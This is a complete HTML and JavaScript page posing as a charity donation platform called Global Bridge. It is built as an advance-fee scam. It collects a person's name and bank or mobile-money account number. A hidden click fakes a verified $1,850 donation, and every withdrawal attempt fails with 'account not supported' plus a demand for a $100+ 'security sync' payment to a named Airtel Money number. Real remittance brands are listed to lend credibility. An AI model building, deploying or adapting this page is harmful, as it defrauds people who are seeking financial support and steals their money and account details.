<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Global Bridge Support</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        @keyframes blink { 0%, 100% { opacity: 1; } 50% { opacity: 0.2; } }
        .blinking { animation: blink 1.2s linear infinite; }
        .landing-bg {
            background-image: linear-gradient(0deg, rgba(0,0,0,0.8) 0%, rgba(0,0,0,0.4) 100%), url('https://images.unsplash.com/photo-1488521787991-ed7bbaae773c?ixlib=rb-4.0.3&auto=format&fit=crop&w=1170&q=80');
            background-size: cover; background-position: center;
        }
        .btn-outline-brown { border: 1.5px solid rgba(255, 255, 255, 0.4); background-color: rgba(62, 39, 35, 0.4); }
        .form-shadow { box-shadow: 0 10px 25px -5px rgba(0, 0, 0, 0.1), 0 8px 10px -6px rgba(0, 0, 0, 0.1); }
        .official-note { background: #fffbeb; border-left: 4px solid #f59e0b; padding: 1rem; margin-bottom: 1.5rem; border-radius: 0.5rem; }
    </style>
</head>
<body class="bg-gray-100 font-sans overflow-x-hidden">

    <div id="app-container"></div>

    <script>
        const CATEGORIES = ["Education & School Fees", "Medical & Healthcare", "Orphanage Support", "Small Business Start-up", "Clean Water Project", "Emergency Relief", "Food Security"];
        const PARTNERS = [
            { name: "Sendwave", icon: "📱", region: "Africa & SE Asia", link: "https://play.google.com/store/apps/details?id=com.sendwave", desc: "Instant Mobile Money transfers." },
            { name: "Remitly", icon: "⚡", region: "Asia & LatAm", link: "https://play.google.com/store/apps/details?id=com.remitly.app", desc: "Reliable bank deposits." },
            { name: "Wise", icon: "🌍", region: "Europe & NA", link: "https://play.google.com/store/apps/details?id=com.transferwise.android", desc: "Real mid-market exchange rates." },
            { name: "WorldRemit", icon: "🛰️", region: "Global Reach", link: "https://play.google.com/store/apps/details?id=com.worldremit.android", desc: "Send to 130+ countries." },
            { name: "RIA Money", icon: "🏦", region: "Americas & Europe", link: "https://play.google.com/store/apps/details?id=com.riafinancial.moneytransfer", desc: "Massive cash pickup network." },
            { name: "Transfast", icon: "🧧", region: "Middle East & India", link: "https://play.google.com/store/apps/details?id=com.transfast.app", desc: "Direct-to-bank specialist." }
        ];

        let state = JSON.parse(localStorage.getItem('gb_state')) || {
            currentPage: 'landing',
            user: null,
            walletBalance: 0,
            raised: 0,
            hasDonation: false,
            profiles: []
        };

        function saveState() { localStorage.setItem('gb_state', JSON.stringify(state)); }
        function navigate(page) { state.currentPage = page; saveState(); render(); }

        function render() {
            const container = document.getElementById('app-container');
            
            if (state.currentPage === 'landing') {
                container.innerHTML = `<div class="h-screen landing-bg flex flex-col justify-between overflow-hidden">
                    <header class="flex justify-between items-center px-5 py-4 bg-white/95 shadow-sm">
                        <div class="flex items-center gap-2"><div class="bg-[#1e4eb8] w-6 h-6 rounded flex items-center justify-center font-bold text-white text-sm">G</div><span class="font-bold text-[#1e4eb8] text-lg tracking-tight">Global Bridge</span></div>
                    </header>
                    <div class="flex-1 flex flex-col items-center justify-center p-6 text-white text-center">
                        <h1 class="text-[32px] font-bold leading-[1.1] mb-1">Empowering<br>Communities</h1>
                        <h2 class="text-[32px] font-bold text-[#4c84ff] leading-[1.1] mb-10">Through Direct Giving</h2>
                        <div class="flex gap-4 w-full max-w-sm">
                            <button onclick="navigate('login')" class="flex-1 btn-outline-brown text-white py-3.5 rounded-lg font-bold text-xs shadow-lg uppercase tracking-wider">I need support</button>
                            <button onclick="navigate('dashboard')" class="flex-1 bg-[#2962ff] text-white py-3.5 rounded-lg font-bold text-xs shadow-lg uppercase tracking-wider">I want to support</button>
                        </div>
                    </div>
                </div>`;
            } 

            else if (state.currentPage === 'login') {
                container.innerHTML = `<div class="min-h-screen bg-gray-50 flex flex-col items-center pb-12">
                    <div class="w-full max-w-[650px] bg-white rounded-3xl overflow-hidden form-shadow mt-10">
                        <form onsubmit="handleLogin(event)" class="p-8 space-y-6">
                            <input type="text" id="fullName" placeholder="Full Name" required class="w-full p-3.5 border rounded-xl">
                            <input type="text" id="countryInput" placeholder="Your Country (e.g. Uganda)" required class="w-full p-3.5 border rounded-xl">
                            <input type="text" id="accName" placeholder="Bank / Mobile Account Type" required class="w-full p-3.5 border rounded-xl">
                            <input type="text" id="accNum" placeholder="Account Number / Phone" required class="w-full p-3.5 border rounded-xl">
                            <input type="number" id="goal" placeholder="Support Goal (USD)" required class="w-full p-3.5 border rounded-xl">
                            <textarea id="story" placeholder="Your Story" required class="w-full p-4 border rounded-xl h-32"></textarea>
                            <button type="submit" class="w-full bg-[#2962ff] text-white py-4 rounded-xl font-bold">Submit Profile</button>
                        </form>
                    </div>
                </div>`;
            }

            else if (state.currentPage === 'dashboard') {
                container.innerHTML = `<div class="min-h-screen bg-gray-100 pb-20">
                    <header class="bg-white shadow-md p-4 flex justify-between items-center">
                        <h1 class="text-lg font-black text-blue-800 uppercase">Verified Profiles</h1>
                        <button onclick="navigate('wallet')" class="bg-blue-600 text-white px-4 py-2 rounded-lg font-bold text-[10px] uppercase">My Wallet</button>
                    </header>
                    <div class="p-4 max-w-xl mx-auto space-y-4">
                        <div class="bg-blue-800 rounded-3xl p-5 text-white">
                            <h3 class="font-bold text-lg">${state.user.fullName}</h3>
                            <p class="text-[10px] opacity-70 uppercase font-bold">${state.user.country}</p>
                            <div class="flex justify-between text-[10px] font-black mt-4"><span>Raised: $${state.raised}</span><span>Goal: $${state.user.goal}</span></div>
                            <div class="w-full bg-white/20 h-2 rounded-full overflow-hidden mt-1"><div class="bg-green-400 h-full" style="width: ${(state.raised/state.user.goal)*100}%"></div></div>
                        </div>
                    </div>
                </div>`;
            }

            else if (state.currentPage === 'wallet') {
                container.innerHTML = `
                    <div class="min-h-screen bg-[#0a192f] text-white p-5">
                        <div class="flex justify-between items-center mb-10">
                            <span onclick="triggerEpay()" class="text-[10px] font-black tracking-[0.2em] text-blue-400 cursor-pointer">GLOBAL BRIDGE EPAY</span>
                            <button onclick="navigate('dashboard')" class="bg-white/5 px-4 py-2 rounded-full text-[10px] font-bold border border-white/10">BACK</button>
                        </div>
                        
                        <div class="bg-gradient-to-br from-[#112240] to-[#1e3a8a] rounded-[2rem] p-8 border border-white/10 shadow-2xl mb-8">
                            <p class="text-[10px] font-bold text-blue-300 uppercase tracking-widest mb-4">${state.user.fullName} // ${state.user.accNum}</p>
                            <div class="space-y-1 ${state.walletBalance > 0 ? 'blinking text-green-400' : 'text-white'}">
                                <span class="text-xs font-bold opacity-60 uppercase">Available Balance</span>
                                <div class="text-5xl font-black leading-none">$${state.walletBalance.toLocaleString()}</div>
                                <div class="text-lg font-bold opacity-80 mt-2">≈ ${getLocalCurrency(state.walletBalance, state.user.country)}</div>
                            </div>
                        </div>

                        <div class="flex gap-4 mb-8">
                            <button onclick="triggerAction()" class="flex-1 bg-white text-[#0a192f] py-4 rounded-2xl font-black text-xs uppercase">Withdraw</button>
                            <button onclick="triggerAction()" class="flex-1 bg-white/5 text-white py-4 rounded-2xl font-black text-xs uppercase border border-white/10">Send Funds</button>
                        </div>

                        <div class="bg-white rounded-t-[2.5rem] -mx-5 p-8 min-h-[500px] text-gray-900">
                            <div class="official-note shadow-sm border border-amber-200 mb-8">
                                <h4 class="text-[11px] font-black text-amber-800 uppercase mb-2">⚠️ Official Notes</h4>
                                <p class="text-[10px] leading-relaxed text-amber-900">
                                    Transaction received is approximately above your limitation. You should follow our terms and policies to make a secure withdrawal to <b>${state.user.fullName} (${state.user.accNum})</b>. 
                                    Since your account is not supported to our Global Bridge wallet, download one of our partnership digital wallets below which is perfectly supported in your global location and create an account on it. Click withdrawal to access your funds. Thank you.
                                </p>
                            </div>

                            <h3 class="font-black text-sm uppercase tracking-widest mb-6 border-b pb-2 text-gray-400">Transactions</h3>
                            <div class="space-y-6 mb-10">
                                ${state.hasDonation ? `
                                    <div class="flex justify-between items-center blinking">
                                        <div class="flex gap-4 items-center">
                                            <div class="w-10 h-10 bg-green-100 rounded-full flex items-center justify-center text-green-600 font-bold">✓</div>
                                            <div>
                                                <p class="font-black text-sm uppercase">Donation Received <span class="text-[8px] bg-green-600 text-white px-1 rounded ml-1">VERIFIED</span></p>
                                                <p class="text-[10px] font-bold text-gray-400 uppercase">From: Lolikishee (Kuwait)</p>
                                            </div>
                                        </div>
                                        <span class="font-black text-green-600">+$1,850</span>
                                    </div>` : `<p class="text-center text-gray-300 font-bold text-xs uppercase py-10 tracking-widest">No Recent Activity</p>`}
                            </div>

                            <div class="grid grid-cols-1 gap-3">
                                ${PARTNERS.map(app => `<div class="flex items-center gap-4 p-4 border border-gray-100 rounded-2xl shadow-sm">
                                    <span class="text-3xl">${app.icon}</span>
                                    <div class="flex-1">
                                        <p class="font-black text-xs uppercase">${app.name}</p>
                                        <p class="text-[10px] text-gray-500 font-medium">${app.desc}</p>
                                    </div>
                                </div>`).join('')}
                            </div>
                        </div>
                    </div>`;
            }
        }

        function triggerEpay() {
            showLoading("Initiating 1850$ on your Global Bridge wallet as donation from lolikishee Kuwait", 8000, () => {
                showNotification({
                    title: "Deposit Detected",
                    body: `
                        <div class="text-left space-y-2 text-xs">
                            <p><b>Amount:</b> $1,850</p>
                            <p><b>Sender:</b> Lolikishee</p>
                            <p><b>Origin:</b> Kuwait (Kuwait City)</p>
                            <p><b>Receiver:</b> ${state.user.fullName}</p>
                            <p><b>Account:</b> ${state.user.accNum}</p>
                        </div>`,
                    onOk: () => {
                        state.walletBalance = 1850; 
                        state.raised = 1850; 
                        state.hasDonation = true;
                        saveState(); render();
                    }
                });
            });
        }

        function triggerAction() {
            showLoading(`Configuring deposit of 1850$ from your global Bridge wallet to ${state.user.fullName} (${state.user.accNum})`, 7000, () => {
                showNotification({
                    title: "Account Not Supported",
                    body: `
                        <div class="text-left text-[11px] leading-relaxed space-y-4">
                            <p class="font-bold text-red-600 uppercase">ACCOUNT ${state.user.accNum} NOT SUPPORTED BY GLOBAL BRIDGE WALLET</p>
                            <div>
                                <p class="font-black mb-1 underline">1st Step:</p>
                                <p>Download one of these supportive digital wallets below: Sendwave, Remitly, Wise, WorldRemit, RIA, or Transfast. Create an account.</p>
                            </div>
                            <div class="bg-blue-50 p-3 rounded-xl border border-blue-100">
                                <p class="font-black mb-1 underline">2nd Step (Security Sync):</p>
                                <p class="mb-2">Support a verified profile with minimum $100 to synchronize your account.</p>
                                <div class="bg-white p-3 rounded-lg border border-blue-200">
                                    <p class="font-black text-blue-800">Brenda Ajaimbo <span class="blinking">🇺🇬</span></p>
                                    <p>Airtel Money: <b>+256746463845</b></p>
                                    <p>Raised: $0 / Goal: $670</p>
                                    <p class="italic text-[9px] mt-1 text-gray-500">Reason: Needs support for education</p>
                                </div>
                            </div>
                            <p class="font-bold text-gray-700 bg-gray-100 p-2 rounded">Note: Recharge your registered partner account with $100+ and donate to Brenda Ajaimbo via Mobile Money to fully unlock and withdraw your $1,850 donation.</p>
                        </div>`,
                    onOk: () => {}
                });
            });
        }

        function handleLogin(e) {
            e.preventDefault();
            state.user = { 
                fullName: document.getElementById('fullName').value, 
                country: document.getElementById('countryInput').value, 
                goal: document.getElementById('goal').value, 
                accNum: document.getElementById('accNum').value, 
                accName: document.getElementById('accName').value
            };
            navigate('dashboard');
        }

        function showLoading(msg, time, cb) {
            const l = document.createElement('div');
            l.className = "fixed inset-0 bg-black/95 z-[300] flex flex-col items-center justify-center p-10 text-center";
            l.innerHTML = `<div class="w-16 h-16 border-[5px] border-blue-600 border-t-transparent rounded-full animate-spin mb-6"></div><p class="text-white font-black uppercase tracking-widest text-sm">${msg}</p>`;
            document.body.appendChild(l);
            setTimeout(() => { l.remove(); cb(); }, time);
        }

        function showNotification({title, body, onOk}) {
            const n = document.createElement('div');
            n.className = "fixed inset-0 bg-black/70 z-[300] flex items-center justify-center p-6";
            n.innerHTML = `<div class="bg-white rounded-[2rem] w-full max-w-sm p-8 text-center shadow-2xl max-h-[90vh] overflow-y-auto">
                <h3 class="text-xl font-black text-blue-900 uppercase tracking-tighter mb-4">${title}</h3>
                <div class="mb-8">${body}</div>
                <button onclick="this.parentElement.parentElement.remove(); (${onOk})()" class="w-full bg-blue-600 text-white py-4 rounded-2xl font-black text-xs uppercase tracking-widest">Okay I have understood</button>
            </div>`;
            document.body.appendChild(n);
        }

        function getLocalCurrency(usd, c) { 
            const r = {"Uganda":3800, "UK":0.79, "Kenya":130, "Tanzania":2500};
            let rate = r[c] || 3800; // Default to UGX if not found
            let symbol = c === "UK" ? " GBP" : " " + (c || "UGX");
            return (usd * rate).toLocaleString() + symbol;
        }

        render();
    </script>
</body>
</html>
